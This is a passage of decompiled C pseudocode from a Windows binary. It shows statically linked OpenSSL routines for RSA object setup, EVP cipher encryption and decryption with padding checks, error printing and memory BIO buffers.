      v5 = *(_DWORD *)(*(_DWORD *)v3 + 36) == 0;
      v3 = *(_DWORD *)v3 + 36;
    }
    while ( !v5 );
  }
  *(_DWORD *)(v4 + 36) = a2;
  if ( a2 )
    *(_DWORD *)(a2 + 40) = v4;
  sub_405390(a1, 6, 0, v4);
  return a1;
}

//----- (00405500) --------------------------------------------------------
int *__cdecl sub_405500(int **a1, int a2)
{
  int *result; // eax
  int v3; // ecx

  result = (int *)a1;
  if ( a1 )
  {
    do
    {
      if ( *result )
      {
        v3 = *(_DWORD *)*result;
        if ( (_BYTE)a2 )
        {
          if ( v3 == a2 )
            return result;
        }
        else if ( (v3 & a2) != 0 )
        {
          return result;
        }
      }
      result = (int *)result[9];
    }
    while ( result );
  }
  return result;
}

//----- (00405540) --------------------------------------------------------
int __cdecl sub_405540(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
    return *(_DWORD *)(a1 + 36);
  return result;
}

//----- (00405550) --------------------------------------------------------
int __cdecl sub_405550(volatile LONG *Block)
{
  volatile LONG *v1; // esi
  int v2; // edi
  volatile LONG *v3; // eax
  int result; // eax

  v1 = Block;
  if ( Block )
  {
    do
    {
      v2 = *((_DWORD *)v1 + 11);
      v3 = v1;
      v1 = (volatile LONG *)*((_DWORD *)v1 + 9);
      result = sub_404F50(v3);
    }
    while ( v2 <= 1 && v1 );
  }
  return result;
}

//----- (00405580) --------------------------------------------------------
_DWORD *__cdecl sub_405580(_DWORD *a1)
{
  _DWORD *result; // eax
  int v2; // ecx

  result = a1;
  v2 = a1[9];
  a1[5] |= *(_DWORD *)(v2 + 20) & 0xF;
  a1[6] = *(_DWORD *)(v2 + 24);
  return result;
}

//----- (004055A0) --------------------------------------------------------
void sub_4055A0()
{
  sub_414F10();
  sub_4146D0(dword_73C6C4);
  dword_73C6C4 = 0;
  sub_4146D0(dword_53892C);
  dword_53892C = 0;
}

//----- (004055E0) --------------------------------------------------------
int __cdecl sub_4055E0(_DWORD *a1, int a2, int a3, int a4)
{
  return sub_405390(a1, a2, a3, (int)&a4);
}

//----- (00405610) --------------------------------------------------------
char **sub_405610()
{
  char **result; // eax

  result = (char **)dword_5373C0;
  if ( !dword_5373C0 )
  {
    result = sub_414F30();
    dword_5373C0 = (int)result;
  }
  return result;
}
// 5373C0: using guessed type int dword_5373C0;

//----- (00405630) --------------------------------------------------------
void __cdecl sub_405630(volatile LONG *Block)
{
  volatile LONG *v1; // esi
  void (__cdecl *v2)(volatile LONG *); // eax

  v1 = Block;
  if ( Block )
  {
    sub_4147E0(Block + 13, -1, &Block);
    if ( (int)Block <= 0 )
    {
      v2 = *(void (__cdecl **)(volatile LONG *))(*((_DWORD *)v1 + 2) + 32);
      if ( v2 )
        v2(v1);
      sub_4162A0(*((volatile LONG **)v1 + 3));
      sub_414DC0(9u, (int)v1, (int **)v1 + 12);
      sub_4146D0(*((LPCRITICAL_SECTION *)v1 + 21));
      sub_417000(*((_DWORD **)v1 + 4));
      sub_417000(*((_DWORD **)v1 + 5));
      sub_417000(*((_DWORD **)v1 + 6));
      sub_417000(*((_DWORD **)v1 + 7));
      sub_417000(*((_DWORD **)v1 + 8));
      sub_417000(*((_DWORD **)v1 + 9));
      sub_417000(*((_DWORD **)v1 + 10));
      sub_417000(*((_DWORD **)v1 + 11));
      sub_416360(*((void **)v1 + 19));
      sub_416360(*((void **)v1 + 20));
      sub_413490(*((void **)v1 + 18));
      sub_413490((void *)v1);
    }
  }
}

//----- (00405720) --------------------------------------------------------
int __cdecl sub_405720(int a1, int a2, int a3)
{
  return sub_414870((int *)(a1 + 48), a2, a3);
}

//----- (00405730) --------------------------------------------------------
int __cdecl sub_405730(int a1, int a2)
{
  _DWORD *v3; // [esp+4h] [ebp+4h]

  v3 = (_DWORD *)(a1 + 48);
  if ( *v3 && a2 < sub_426A30(*v3) )
    return sub_426A40(*v3, a2);
  else
    return 0;
}
// 426A30: using guessed type _DWORD __cdecl sub_426A30(_DWORD);
// 426A40: using guessed type _DWORD __cdecl sub_426A40(_DWORD, _DWORD);

//----- (00405760) --------------------------------------------------------
int __cdecl sub_405760(void ***a1, void **a2, void **a3, void **a4)
{
  if ( !a1[4] && !a2 || !a1[5] && !a3 )
    return 0;
  if ( a2 )
  {
    sub_417060(a1[4]);
    a1[4] = a2;
  }
  if ( a3 )
  {
    sub_417060(a1[5]);
    a1[5] = a3;
  }
  if ( a4 )
  {
    sub_417060(a1[6]);
    a1[6] = a4;
  }
  return 1;
}

//----- (004057D0) --------------------------------------------------------
int __cdecl sub_4057D0(_DWORD *a1)
{
  _DWORD *v1; // eax
  int v2; // esi
  struct _RTL_CRITICAL_SECTION *v4; // eax
  char **v5; // eax
  int v6; // eax
  int (__cdecl *v7)(int); // eax

  v1 = sub_413430(0x58u);
  v2 = (int)v1;
  if ( !v1 )
  {
    sub_408310(4, 106, 65, (int)"crypto\\rsa\\rsa_lib.c", 75);
    return 0;
  }
  v1[13] = 1;
  v4 = sub_414650();
  *(_DWORD *)(v2 + 84) = v4;
  if ( !v4 )
  {
    sub_408310(4, 106, 65, (int)"crypto\\rsa\\rsa_lib.c", 82);
    sub_413490((void *)v2);
    return 0;
  }
  v5 = (char **)dword_5373C0;
  if ( !dword_5373C0 )
  {
    v5 = sub_414F30();
    dword_5373C0 = (int)v5;
  }
  *(_DWORD *)(v2 + 8) = v5;
  *(_DWORD *)(v2 + 56) = (unsigned int)v5[9] & 0xFFFFFBFF;
  if ( a1 )
  {
    if ( !sub_416200(a1) )
    {
      sub_408310(4, 106, 38, (int)"crypto\\rsa\\rsa_lib.c", 92);
LABEL_19:
      sub_405630((volatile LONG *)v2);
      return 0;
    }
    *(_DWORD *)(v2 + 12) = a1;
  }
  else
  {
    *(_DWORD *)(v2 + 12) = sub_417790();
  }
  if ( *(_DWORD *)(v2 + 12) )
  {
    v6 = sub_432B60(*(_DWORD *)(v2 + 12));
    *(_DWORD *)(v2 + 8) = v6;
    if ( !v6 )
    {
      sub_408310(4, 106, 38, (int)"crypto\\rsa\\rsa_lib.c", 101);
      goto LABEL_19;
    }
  }
  *(_DWORD *)(v2 + 56) = *(_DWORD *)(*(_DWORD *)(v2 + 8) + 36) & 0xFFFFFBFF;
  if ( !sub_414B00(9u, v2, (int **)(v2 + 48)) )
    goto LABEL_19;
  v7 = *(int (__cdecl **)(int))(*(_DWORD *)(v2 + 8) + 28);
  if ( v7 && !v7(v2) )
  {
    sub_408310(4, 106, 70, (int)"crypto\\rsa\\rsa_lib.c", 113);
    goto LABEL_19;
  }
  return v2;
}
// 5373C0: using guessed type int dword_5373C0;

//----- (00405910) --------------------------------------------------------
int sub_405910()
{
  return sub_4057D0(0);
}

//----- (00405920) --------------------------------------------------------
int __cdecl sub_405920(void *a1)
{
  int (__cdecl *v1)(void *); // eax
  int result; // eax
  _BYTE *v3; // ecx

  if ( !a1 )
    return 1;
  if ( !*(_DWORD *)a1 )
  {
LABEL_8:
    sub_413490(*((void **)a1 + 24));
    sub_4162A0(*((volatile LONG **)a1 + 1));
    memset(a1, 0, 0x8Cu);
    return 1;
  }
  v1 = *(int (__cdecl **)(void *))(*(_DWORD *)a1 + 28);
  if ( !v1 || (result = v1(a1)) != 0 )
  {
    v3 = (_BYTE *)*((_DWORD *)a1 + 24);
    if ( v3 )
    {
      if ( *(_DWORD *)(*(_DWORD *)a1 + 32) )
        sub_4139E0(v3, *(_DWORD *)(*(_DWORD *)a1 + 32));
    }
    goto LABEL_8;
  }
  return result;
}

//----- (00405990) --------------------------------------------------------
void *sub_405990()
{
  return sub_413430(0x8Cu);
}

//----- (004059B0) --------------------------------------------------------
void __cdecl sub_4059B0(void *Block)
{
  sub_405920(Block);
  sub_413490(Block);
}

//----- (004059D0) --------------------------------------------------------
BOOL __usercall sub_4059D0@<eax>(int a1@<ecx>, unsigned int a2@<esi>, int a3)
{
  return (int)a2 > 0 && a1 != a3 && (a1 - a3 < a2 || -a2 < a1 - a3);
}

//----- (00405A00) --------------------------------------------------------
BOOL __cdecl sub_405A00(_DWORD *a1, char *a2, int *a3, char *Src, int Size)
{
  int v6; // ecx
  int v8; // eax
  int v9; // edi
  char *v10; // ebp
  int v11; // eax
  int v12; // esi
  signed int v13; // esi
  int v14; // esi
  int v15; // edi
  int v16; // [esp+18h] [ebp+4h]

  v6 = *a1;
  if ( (*(_DWORD *)(*a1 + 16) & 0x100000) != 0 )
  {
    if ( a2 != Src && (a2 - Src < (unsigned int)Size || -Size < (unsigned int)(a2 - Src)) && Size > 0 )
    {
      sub_408310(6, 167, 162, (int)"crypto\\evp\\evp_enc.c", 301);
      return 0;
    }
    v8 = (*(int (__cdecl **)(_DWORD *, char *, char *, int))(*a1 + 24))(a1, a2, Src, Size);
    if ( v8 < 0 )
      return 0;
    *a3 = v8;
    return 1;
  }
  else
  {
    v9 = Size;
    if ( Size <= 0 )
    {
      *a3 = 0;
      return Size == 0;
    }
    v10 = Src;
    if ( a2 != Src && (a2 - Src < (unsigned int)Size || -Size < (unsigned int)(a2 - Src)) )
    {
      sub_408310(6, 167, 162, (int)"crypto\\evp\\evp_enc.c", 318);
      return 0;
    }
    v11 = a1[3];
    if ( v11 || (Size & a1[26]) != 0 )
    {
      v12 = *(_DWORD *)(v6 + 4);
      v16 = v12;
      if ( v12 > 32 )
        sub_417C70("assertion failed: bl <= (int)sizeof(ctx->buf)", "crypto\\evp\\evp_enc.c", 333);
      if ( v11 )
      {
        v13 = v12 - v11;
        if ( v13 > Size )
        {
          memcpy((char *)a1 + v11 + 48, Src, Size);
          a1[3] += Size;
          *a3 = 0;
          return 1;
        }
        memcpy((char *)a1 + v11 + 48, Src, v13);
        v10 = &Src[v13];
        v9 = Size - v13;
        v12 = v16;
        if ( sub_4059D0((int)a2, v16, (int)v10) )
        {
          sub_408310(6, 167, 162, (int)"crypto\\evp\\evp_enc.c", 346);
          return 0;
        }
        if ( !(*(int (__cdecl **)(_DWORD *, char *, _DWORD *, int))(*a1 + 24))(a1, a2, a1 + 12, v16) )
          return 0;
        a2 += v16;
        *a3 = v16;
      }
      else
      {
        *a3 = 0;
      }
      v14 = v9 & (v12 - 1);
      v15 = v9 - v14;
      if ( v15 > 0 )
      {
        if ( !(*(int (__cdecl **)(_DWORD *, char *, char *, int))(*a1 + 24))(a1, a2, v10, v15) )
          return 0;
        *a3 += v15;
      }
      if ( v14 )
        memcpy(a1 + 12, &v10[v15], v14);
      a1[3] = v14;
      return 1;
    }
    else if ( (*(int (__cdecl **)(_DWORD *, char *, char *, int))(v6 + 24))(a1, a2, Src, Size) )
    {
      *a3 = Size;
      return 1;
    }
    else
    {
      *a3 = 0;
      return 0;
    }
  }
}

//----- (00405C50) --------------------------------------------------------
int __cdecl sub_405C50(_DWORD *a1, int a2, _DWORD *a3)
{
  int v3; // eax
  int v4; // eax
  int result; // eax
  unsigned int v6; // edi
  unsigned int v7; // ecx

  v3 = *a1;
  if ( (*(_DWORD *)(*a1 + 16) & 0x100000) != 0 )
  {
    v4 = (*(int (__cdecl **)(_DWORD *, int, _DWORD, _DWORD))(v3 + 24))(a1, a2, 0, 0);
    if ( v4 >= 0 )
    {
      *a3 = v4;
      return 1;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    v6 = *(_DWORD *)(v3 + 4);
    if ( v6 > 0x20 )
      sub_417C70("assertion failed: b <= sizeof ctx->buf", "crypto\\evp\\evp_enc.c", 392);
    if ( v6 == 1 )
    {
      result = 1;
      *a3 = 0;
    }
    else
    {
      v7 = a1[3];
      if ( (a1[23] & 0x100) != 0 )
      {
        if ( v7 )
        {
          sub_408310(6, 127, 138, (int)"crypto\\evp\\evp_enc.c", 401);
          return 0;
        }
        else
        {
          *a3 = 0;
          return 1;
        }
      }
      else
      {
        if ( v7 < v6 )
          memset((char *)a1 + v7 + 48, v6 - v7, v6 - v7);
        result = (*(int (__cdecl **)(_DWORD *, int, _DWORD *, unsigned int))(*a1 + 24))(a1, a2, a1 + 12, v6);
        if ( result )
          *a3 = v6;
      }
    }
  }
  return result;
}

//----- (00405D40) --------------------------------------------------------
BOOL __cdecl sub_405D40(_DWORD *a1, char *a2, int *a3, char *Src, int Size)
{
  int v7; // eax
  unsigned int v8; // esi
  char *v9; // ebx
  int v10; // [esp+14h] [ebp+4h]

  if ( (*(_DWORD *)(*a1 + 16) & 0x100000) != 0 )
  {
    if ( a2 != Src && (a2 - Src < (unsigned int)Size || -Size < (unsigned int)(a2 - Src)) && Size > 0 )
    {
      sub_408310(6, 166, 162, (int)"crypto\\evp\\evp_enc.c", 427);
      return 0;
    }
    v7 = (*(int (__cdecl **)(_DWORD *, char *, char *, int))(*a1 + 24))(a1, a2, Src, Size);
    if ( v7 >= 0 )
    {
      *a3 = v7;
      return 1;
    }
    else
    {
      *a3 = 0;
      return 0;
    }
  }
  else if ( Size > 0 )
  {
    if ( (a1[23] & 0x100) != 0 )
    {
      return sub_405A00(a1, a2, a3, Src, Size);
    }
    else
    {
      v8 = *(_DWORD *)(*a1 + 4);
      if ( v8 > 0x20 )
        sub_417C70("assertion failed: b <= sizeof ctx->final", "crypto\\evp\\evp_enc.c", 449);
      v9 = a2;
      if ( a1[25] )
      {
        if ( a2 == Src || sub_4059D0((int)a2, v8, (int)Src) )
        {
          sub_408310(6, 166, 162, (int)"crypto\\evp\\evp_enc.c", 455);
          return 0;
        }
        memcpy(a2, a1 + 27, v8);
        v9 = &a2[v8];
        v10 = 1;
      }
      else
      {
        v10 = 0;
      }
      if ( !sub_405A00(a1, v9, a3, Src, Size) )
        return 0;
      if ( v8 <= 1 || a1[3] )
      {
        a1[25] = 0;
      }
      else
      {
        *a3 -= v8;
        a1[25] = 1;
        memcpy(a1 + 27, &v9[*a3], v8);
      }
      if ( v10 )
        *a3 += v8;
      return 1;
    }
  }
  else
  {
    *a3 = 0;
    return Size == 0;
  }
}

//----- (00405F00) --------------------------------------------------------
int __cdecl sub_405F00(_DWORD *a1, int a2, int *a3)
{
  int v3; // eax
  int v4; // eax
  unsigned int v6; // edi
  signed int v7; // eax
  int v8; // edx
  int v9; // ecx
  int v10; // edi
  int v11; // ecx
  int i; // eax

  *a3 = 0;
  v3 = *a1;
  if ( (*(_DWORD *)(*a1 + 16) & 0x100000) != 0 )
  {
    v4 = (*(int (__cdecl **)(_DWORD *, int, _DWORD, _DWORD))(v3 + 24))(a1, a2, 0, 0);
    if ( v4 < 0 )
      return 0;
    *a3 = v4;
    return 1;
  }
  v6 = *(_DWORD *)(v3 + 4);
  if ( (a1[23] & 0x100) != 0 )
  {
    if ( a1[3] )
    {
      sub_408310(6, 101, 138, (int)"crypto\\evp\\evp_enc.c", 510);
      return 0;
    }
    goto LABEL_26;
  }
  if ( v6 <= 1 )
  {
LABEL_26:
    *a3 = 0;
    return 1;
  }
  if ( a1[3] || !a1[25] )
  {
    sub_408310(6, 101, 109, (int)"crypto\\evp\\evp_enc.c", 518);
    return 0;
  }
  if ( v6 > 0x20 )
    sub_417C70("assertion failed: b <= sizeof ctx->final", "crypto\\evp\\evp_enc.c", 521);
  v7 = *((unsigned __int8 *)a1 + v6 + 107);
  if ( !*((_BYTE *)a1 + v6 + 107) || v7 > (int)v6 )
  {
    sub_408310(6, 101, 100, (int)"crypto\\evp\\evp_enc.c", 529);
    return 0;
  }
  v8 = 0;
  if ( *((_BYTE *)a1 + v6 + 107) )
  {
    v9 = (int)a1 + v6 + 108;
    while ( 1 )
    {
      v10 = *(unsigned __int8 *)--v9;
      if ( v10 != v7 )
        break;
      if ( ++v8 >= v7 )
        goto LABEL_19;
    }
    sub_408310(6, 101, 100, (int)"crypto\\evp\\evp_enc.c", 534);
    return 0;
  }
LABEL_19:
  v11 = *(_DWORD *)(*a1 + 4) - v7;
  for ( i = 0; i < v11; ++i )
    *(_BYTE *)(i + a2) = *((_BYTE *)a1 + i + 108);
  *a3 = v11;
  return 1;
}

//----- (00406060) --------------------------------------------------------
int __cdecl sub_406060(int a1, int a2)
{
  if ( a2 )
    *(_DWORD *)(a1 + 92) &= ~0x100u;
  else
    *(_DWORD *)(a1 + 92) |= 0x100u;
  return 1;
}

//----- (00406090) --------------------------------------------------------
int __cdecl sub_406090(int a1, int a2, int a3, int a4)
{
  int result; // eax
  int (__cdecl *v5)(int, int, int, int); // eax

  if ( *(_DWORD *)a1 )
  {
    v5 = *(int (__cdecl **)(int, int, int, int))(*(_DWORD *)a1 + 44);
    if ( v5 )
    {
      result = v5(a1, a2, a3, a4);
      if ( result == -1 )
      {
        sub_408310(6, 124, 133, (int)"crypto\\evp\\evp_enc.c", 586);
        return 0;
      }
    }
    else
    {
      sub_408310(6, 124, 132, (int)"crypto\\evp\\evp_enc.c", 579);
      return 0;
    }
  }
  else
  {
    sub_408310(6, 124, 131, (int)"crypto\\evp\\evp_enc.c", 574);
    return 0;
  }
  return result;
}

//----- (00406120) --------------------------------------------------------
int __cdecl sub_406120(int a1, int a2)
{
  if ( (*(_DWORD *)(*(_DWORD *)a1 + 16) & 0x200) != 0 )
    return sub_406090(a1, 6, 0, a2);
  else
    return sub_406FF0() > 0;
}

//----- (00406160) --------------------------------------------------------
int __cdecl sub_406160(void *a1, int a2)
{
  size_t v3; // eax
  void *v4; // eax

  if ( a2 && *(_DWORD *)a2 )
  {
    if ( *(_DWORD *)(a2 + 4) && !sub_416200(*(_DWORD **)(a2 + 4)) )
    {
      sub_408310(6, 163, 38, (int)"crypto\\evp\\evp_enc.c", 610);
      return 0;
    }
    sub_405920(a1);
    qmemcpy(a1, (const void *)a2, 0x8Cu);
    if ( *(_DWORD *)(a2 + 96) )
    {
      v3 = *(_DWORD *)(*(_DWORD *)a2 + 32);
      if ( v3 )
      {
        v4 = sub_4133F0(v3);
        *((_DWORD *)a1 + 24) = v4;
        if ( !v4 )
        {
          sub_408310(6, 163, 65, (int)"crypto\\evp\\evp_enc.c", 621);
          return 0;
        }
        memcpy(v4, *(const void **)(a2 + 96), *(_DWORD *)(*(_DWORD *)a2 + 32));
      }
    }
    if ( (*(_DWORD *)(*(_DWORD *)a2 + 16) & 0x400) != 0 )
      return (*(int (__cdecl **)(int, int, _DWORD, void *))(*(_DWORD *)a2 + 44))(a2, 8, 0, a1);
    else
      return 1;
  }
  else
  {
    sub_408310(6, 163, 111, (int)"crypto\\evp\\evp_enc.c", 604);
    return 0;
  }
}

//----- (00406270) --------------------------------------------------------
int __cdecl sub_406270(int **a1, int *a2, int *a3, int a4, void *Src, int a6)
{
  int v6; // eax
  int **v7; // esi
  int *v8; // edi
  int *v9; // ebp
  int *v10; // ebp
  int v12; // eax
  size_t v13; // eax
  int *v14; // eax
  int v15; // edx
  int *v16; // eax
  int v17; // eax
  FILE *v18; // eax
  FILE *v19; // eax
  FILE *v20; // eax
  int v21; // eax
  int *v22; // eax
  int v23; // [esp-8h] [ebp-18h]
  int v24; // [esp-8h] [ebp-18h]

  v6 = a6;
  if ( a6 == -1 )
  {
    v7 = a1;
    a6 = (int)a1[2];
  }
  else
  {
    if ( a6 )
    {
      a6 = 1;
      v6 = 1;
    }
    v7 = a1;
    a1[2] = (int *)v6;
  }
  v8 = a2;
  if ( !v7[1] || !*v7 || a2 && *a2 != **v7 )
  {
    if ( a2 )
    {
      if ( *v7 )
      {
        v9 = v7[23];
        sub_405920(v7);
        v7[2] = (int *)a6;
        v7[23] = v9;
      }
      v10 = a3;
      if ( a3 )
      {
        if ( !sub_416200(a3) )
        {
          sub_408310(6, 123, 134, (int)"crypto\\evp\\evp_enc.c", 95);
          return 0;
        }
      }
      else
      {
        v10 = sub_417D50(*a2);
      }
      if ( v10 )
      {
        v12 = sub_417D70((int)v10, *a2);
        if ( !v12 )
        {
          sub_408310(6, 123, 134, (int)"crypto\\evp\\evp_enc.c", 110);
          return 0;
        }
        v8 = (int *)v12;
        v7[1] = v10;
      }
      else
      {
        v7[1] = 0;
      }
      *v7 = v8;
      v13 = v8[8];
      if ( v13 )
      {
        v14 = (int *)sub_413430(v13);
        v7[24] = v14;
        if ( !v14 )
        {
          sub_408310(6, 123, 65, (int)"crypto\\evp\\evp_enc.c", 128);
          return 0;
        }
      }
      else
      {
        v7[24] = 0;
      }
      v15 = v8[2];
      v16 = *v7;
      v7[23] = (int *)((unsigned int)v7[23] & 1);
      v7[22] = (int *)v15;
      if ( (v16[4] & 0x40) != 0 && !sub_406090((int)v7, 0, 0, 0) )
      {
        sub_408310(6, 123, 134, (int)"crypto\\evp\\evp_enc.c", 139);
        return 0;
      }
    }
    else if ( !*v7 )
    {
      sub_408310(6, 123, 131, (int)"crypto\\evp\\evp_enc.c", 144);
      return 0;
    }
  }
  v17 = (*v7)[1];
  if ( v17 != 1 && v17 != 8 && v17 != 16 )
    sub_417C70(
      "assertion failed: ctx->cipher->block_size == 1 || ctx->cipher->block_size == 8 || ctx->cipher->block_size == 16",
      "crypto\\evp\\evp_enc.c",
      153);
  if ( ((_BYTE)v7[23] & 1) != 0 || (v18 = (FILE *)sub_435D30((int)v7), (_fileno(v18) & 0xF0007) != 65538) )
  {
    v19 = (FILE *)sub_435D30((int)v7);
    if ( (_fileno(v19) & 0x10) == 0 )
    {
      v20 = (FILE *)sub_435D30((int)v7);
      switch ( _fileno(v20) & 0xF0007 )
      {
        case 0:
        case 1:
          goto LABEL_49;
        case 2:
          break;
        case 3:
        case 4:
          v7[20] = 0;
          break;
        case 5:
          v7[20] = 0;
          if ( Src )
          {
            v24 = sub_407410((int)v7);
            memcpy(v7 + 8, Src, v24);
          }
          goto LABEL_49;
        default:
          return 0;
      }
      if ( sub_407410((int)v7) > 16 )
        sub_417C70(
          "assertion failed: EVP_CIPHER_CTX_iv_length(ctx) <= (int)sizeof(ctx->iv)",
          "crypto\\evp\\evp_enc.c",
          177);
      if ( Src )
      {
        v21 = sub_407410((int)v7);
        memcpy(v7 + 4, Src, v21);
      }
      v23 = sub_407410((int)v7);
      memcpy(v7 + 8, v7 + 4, v23);
    }
LABEL_49:
    if ( (a4 || ((*v7)[4] & 0x20) != 0) && !((int (__cdecl *)(int **, int, void *, int))(*v7)[5])(v7, a4, Src, a6) )
      return 0;
    v22 = *v7;
    v7[3] = 0;
    v7[25] = 0;
    v7[26] = (int *)(v22[1] - 1);
    return 1;
  }
  else
  {
    sub_408310(6, 123, 170, (int)"crypto\\evp\\evp_enc.c", 157);
    return 0;
  }
}

//----- (00406560) --------------------------------------------------------
BOOL __cdecl sub_406560(_DWORD *a1, char *a2, int *a3, char *a4, int a5)
{
  if ( a1[2] )
    return sub_405A00(a1, a2, a3, a4, a5);
  else
    return sub_405D40(a1, a2, a3, a4, a5);
}

//----- (00406580) --------------------------------------------------------
int __cdecl sub_406580(_DWORD *a1, int a2, int *a3)
{
  if ( a1[2] )
    return sub_405C50(a1, a2, a3);
  else
    return sub_405F00(a1, a2, a3);
}

//----- (004065A0) --------------------------------------------------------
int __cdecl sub_4065A0(int **a1, int *a2, int *a3, int a4, void *Src)
{
  return sub_406270(a1, a2, a3, a4, Src, 1);
}

//----- (004065D0) --------------------------------------------------------
int __cdecl sub_4065D0(int **a1, int *a2, int *a3, int a4, void *Src)
{
  return sub_406270(a1, a2, a3, a4, Src, 0);
}

//----- (00406600) --------------------------------------------------------
int __cdecl sub_406600(_DWORD *a1, int a2)
{
  int v2; // edx

  v2 = *(_DWORD *)(*a1 + 16);
  if ( (v2 & 0x80u) != 0 )
    return sub_406090((int)a1, 1, a2, 0);
  if ( a1[22] == a2 )
    return 1;
  if ( a2 > 0 && (v2 & 8) != 0 )
  {
    a1[22] = a2;
    return 1;
  }
  sub_408310(6, 122, 130, (int)"crypto\\evp\\evp_enc.c", 557);
  return 0;
}

//----- (00406660) --------------------------------------------------------
int __cdecl sub_406660(int (__cdecl *a1)(char *, unsigned int, int), int a2)
{
  int CurrentThreadId; // esi
  int result; // eax
  int v4; // [esp+Ch] [ebp-1114h] BYREF
  int v5; // [esp+10h] [ebp-1110h] BYREF
  int v6; // [esp+14h] [ebp-110Ch] BYREF
  int v7; // [esp+18h] [ebp-1108h] BYREF
  char Str[256]; // [esp+1Ch] [ebp-1104h] BYREF
  char v9[4096]; // [esp+11Ch] [ebp-1004h] BYREF

  CurrentThreadId = GetCurrentThreadId();
  for ( result = sub_408630(&v5, &v4, &v6, &v7); result; result = sub_408630(&v5, &v4, &v6, &v7) )
  {
    sub_408480(result, Str, 0x100u);
    sub_4191B0((int)v9, 4096, "%lu:%s:%s:%d:%s\n", CurrentThreadId);
    result = a1(v9, strlen(v9), a2);
    if ( result <= 0 )
      break;
  }
  return result;
}
// 406660: using guessed type char Str[256];

//----- (00406770) --------------------------------------------------------
int __cdecl sub_406770(int a1, int a2, int a3)
{
  return sub_405110(a3, a1, a2);
}

//----- (00406790) --------------------------------------------------------
int __cdecl sub_406790(int a1)
{
  return sub_406660((int (__cdecl *)(char *, unsigned int, int))sub_406770, a1);
}

//----- (004067B0) --------------------------------------------------------
int __cdecl sub_4067B0(int a1)
{
  int result; // eax
  volatile LONG *v2; // esi

  result = sub_4197A0(a1, 0);
  v2 = (volatile LONG *)result;
  if ( result )
  {
    sub_406660((int (__cdecl *)(char *, unsigned int, int))sub_406770, result);
    return sub_404F50(v2);
  }
  return result;
}

//----- (004067E0) --------------------------------------------------------
void *sub_4067E0()
{
  return &unk_4F12BC;
}

//----- (004067F0) --------------------------------------------------------
_DWORD *__cdecl sub_4067F0(const char *a1, int a2)
{
  _DWORD *result; // eax
  unsigned int v3; // esi
  unsigned int **v4; // edx
  unsigned int *v5; // ecx
  unsigned int *v6; // ecx
  unsigned int v7; // esi
  unsigned int *v8; // edx

  if ( a1 )
  {
    v3 = a2;
    if ( a2 < 0 )
      v3 = strlen(a1);
    result = (_DWORD *)sub_404E70((int)&unk_4F12BC);
    if ( result )
    {
      v4 = (unsigned int **)result[8];
      v5 = *v4;
      v5[1] = (unsigned int)a1;
      *v5 = v3;
      v5[2] = v3;
      v6 = *v4;
      v7 = **v4;
      v8 = v4[1];
      *v8 = v7;
      v8[1] = v6[1];
      v8[2] = v6[2];
      v8[3] = v6[3];
      result[5] |= 0x200u;
      result[7] = 0;
    }
  }
  else
  {
    sub_408310(32, 126, 115, (int)"crypto\\bio\\bss_mem.c", 81);
    return 0;
  }
  return result;
}

//----- (00406880) --------------------------------------------------------
int __usercall sub_406880@<eax>(_DWORD *a1@<edi>, int a2)
{
  _DWORD *v2; // esi
  _DWORD *v3; // eax
  int result; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // ecx

  v2 = sub_413430(8u);
  if ( !v2 )
    return 0;
  v3 = sub_419B00(a2);
  *v2 = v3;
  if ( !v3 )
  {
    sub_413490(v2);
    return 0;
  }
  v5 = sub_413430(0x10u);
  v6 = (_DWORD *)*v2;
  v2[1] = v5;
  if ( v5 )
  {
    *v5 = *v6;
    v5[1] = v6[1];
    v5[2] = v6[2];
    v5[3] = v6[3];
    result = 1;
    a1[8] = v2;
    a1[4] = 1;
    a1[3] = 1;
    a1[7] = -1;
  }
  else
  {
    sub_419810(v6);
    sub_413490(v2);
    return 0;
  }
  return result;
}

//----- (00406920) --------------------------------------------------------
int __cdecl sub_406920(_DWORD *a1)
{
  return sub_406880(a1, 0);
}

//----- (00406940) --------------------------------------------------------
int __cdecl sub_406940(_DWORD *a1)
{
  return sub_406880(a1, 1);
}

//----- (00406960) --------------------------------------------------------
int __usercall sub_406960@<eax>(_DWORD *a1@<esi>, int a2)
{
  void **v3; // edi
  _DWORD *v4; // eax

  if ( !a1 )
    return 0;
  if ( a1[4] )
  {
    if ( a1[3] )
    {
      v3 = (void **)a1[8];
      if ( v3 )
      {
        v4 = *v3;
        if ( (a1[5] & 0x200) != 0 )
          v4[1] = 0;
        sub_419810(v4);
        if ( a2 )
        {
          sub_413490(v3[1]);
          sub_413490(v3);
        }
        a1[8] = 0;
      }
    }
  }
  return 1;
}

//----- (004069E0) --------------------------------------------------------
int __cdecl sub_4069E0(int a1)
{
  _DWORD *v1; // esi
  void *v2; // ecx
  size_t *v3; // edx

  if ( a1 )
  {
    if ( *(_DWORD *)(a1 + 12) )
    {
      v1 = *(_DWORD **)(a1 + 32);
      if ( v1 )
      {
        v2 = *(void **)(*v1 + 4);
        v3 = (size_t *)v1[1];
        if ( (void *)v3[1] != v2 )
        {
          memcpy_0(v2, *(const void **)(v1[1] + 4), *v3);
          *(_DWORD *)*v1 = *(_DWORD *)v1[1];
          *(_DWORD *)(v1[1] + 4) = *(_DWORD *)(*v1 + 4);
        }
      }
    }
  }
  return 0;
}

//----- (00406A30) --------------------------------------------------------
int __cdecl sub_406A30(int a1, void *a2, int a3)
{
  int v3; // esi
  signed int v4; // edi
  int v6; // esi

  v3 = *(_DWORD *)(*(_DWORD *)(a1 + 32) + 4);
  sub_405010(a1, 15);
  if ( a3 < 0 || (v4 = *(_DWORD *)v3, (unsigned int)a3 <= *(_DWORD *)v3) )
    v4 = a3;
  if ( a2 && v4 > 0 )
  {
    memcpy(a2, *(const void **)(v3 + 4), v4);
    *(_DWORD *)v3 -= v4;
    *(_DWORD *)(v3 + 4) += v4;
    return v4;
  }
  if ( *(_DWORD *)v3 )
    return v4;
  v6 = *(_DWORD *)(a1 + 28);
  if ( v6 )
    sub_405030(a1, 9);
  return v6;
}

//----- (00406AA0) --------------------------------------------------------
size_t __cdecl sub_406AA0(int a1, void *Src, size_t Size)
{
  int *v3; // esi
  int v5; // ebx
  _DWORD *v6; // eax
  _DWORD *v7; // ecx

  v3 = *(int **)(a1 + 32);
  if ( Src )
  {
    if ( (*(_DWORD *)(a1 + 20) & 0x200) != 0 )
    {
      sub_408310(32, 117, 126, (int)"crypto\\bio\\bss_mem.c", 211);
      return -1;
    }
    else
    {
      sub_405010(a1, 15);
      v5 = *(_DWORD *)v3[1];
      sub_4069E0(a1);
